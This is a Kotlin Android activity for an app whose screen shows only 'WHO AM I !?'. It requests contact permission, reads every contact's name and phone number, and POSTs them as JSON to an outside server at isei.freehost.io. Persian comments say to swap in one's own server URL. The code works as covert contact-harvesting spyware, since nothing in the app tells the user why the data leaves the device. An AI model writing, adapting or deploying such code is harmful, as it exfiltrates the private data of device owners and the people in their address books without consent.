package com.example.contactsapp

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.ContactsContract
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    private val REQUEST_CONTACTS = 1
    private lateinit var output: TextView
    private val serverUrl = "https://isei.freehost.io/save_contacts.php" // 🔁 اینجا URL واقعی خودت رو بذار

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        output = TextView(this)
        output.text = "WHO AM I !?"
        output.textSize = 20f
        output.setPadding(30, 100, 30, 30)
        setContentView(output)

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                arrayOf(Manifest.permission.READ_CONTACTS),
                REQUEST_CONTACTS)
        } else {
            sendContacts()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        if (requestCode == REQUEST_CONTACTS && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            sendContacts()
        } else {
            output.text = "❌ اجازه‌ی خواندن مخاطبین داده نشد."
        }
    }

    private fun sendContacts() {
        val contacts = JSONArray()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null)

        cursor?.use {
            val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val phoneIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext()) {
                val obj = JSONObject()
                obj.put("name", it.getString(nameIdx))
                obj.put("phone", it.getString(phoneIdx))
                contacts.put(obj)
            }
        }

        output.text = "✅ مخاطبین استخراج شدند. در حال ارسال به سرور..."

        // ارسال با HTTP POST
        Thread {
            try {
                val url = URL(serverUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")

                val out = OutputStreamWriter(conn.outputStream)
                out.write(contacts.toString())
                out.flush()
                out.close()

                val response = conn.inputStream.bufferedReader().readText()

                runOnUiThread {
                    output.text = "✅ اطلاعات ارسال شد:\n$response"
                }
            } catch (e: Exception) {
                e.printStackTrace()
                runOnUiThread {
                    output.text = "❌ خطا در ارسال اطلاعات:\n${e.message}"
                }
            }
        }.start()
    }
}